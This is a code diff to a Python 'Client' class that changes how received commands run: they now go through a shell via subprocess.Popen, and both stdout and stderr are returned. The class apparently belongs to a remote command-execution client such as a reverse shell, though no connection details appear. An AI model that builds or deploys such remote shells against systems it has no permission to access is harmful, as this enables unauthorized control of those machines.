@@ -21,8 +21,8 @@ class Client():
             self.KEEP_GOING = False
 
     def handle(self, command):
-        p = subprocess.getstatusoutput(command)
-        return p[1]
+        output = subprocess.Popen(command, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE, shell=True, universal_newlines=True)
+        return f'{output.stdout.read()} {output.stderr.read()}'
     
     def receive(self):
         while self.KEEP_GOING:
